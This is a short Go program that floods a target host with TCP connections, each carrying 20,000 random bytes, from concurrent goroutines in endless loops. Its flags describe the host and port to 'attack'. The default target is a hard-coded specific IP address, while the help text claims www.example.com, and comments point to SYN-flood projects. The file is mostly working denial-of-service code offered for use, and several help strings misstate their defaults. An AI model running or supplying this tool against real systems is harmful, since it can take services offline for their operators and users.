package main

import (
	"fmt"
	flag "github.com/spf13/pflag"
	"math/rand"
	"net"
	"time"
)

var (
	proto, host string
	port, concurrency int
)

func init() {
	flag.StringVar(&proto, "proto", "tcp", "protocol to attack, defaults to tcp")
	flag.StringVar(&host, "host", "213.238.175.187", "host to attack, defaults to www.example.com")
	flag.IntVar(&port, "port", 443, "port to attack, defaults to 80")
	flag.IntVar(&concurrency, "concurrency", 10, "concurrency count to run goroutines, defaults to 2")

	rand.Seed(time.Now().UnixNano())
}

func main() {
	// https://www.programmersought.com/article/74831586115/
	// https://github.com/rootVIII/gosynflood
	// https://golangexample.com/repeatedly-send-crafted-tcp-syn-packets-with-raw-sockets/
	for i := 0; i < concurrency; i++ {
		go func() {
			connectionCount := 0
			for true {
				conn, err := net.DialTimeout(proto, fmt.Sprintf("%s:%d", host, port), 100*time.Second)
				if err != nil {
					panic(err)
				}
				bytes := make([]byte, 20000)
				rand.Read(bytes)
				_, err = conn.Write(bytes)
				if err != nil {
					panic(err)
				}

				connectionCount++
				// log.Printf("connection established, count = %d\n", connectionCount)
			}
		}()
	}

	select {

	}
}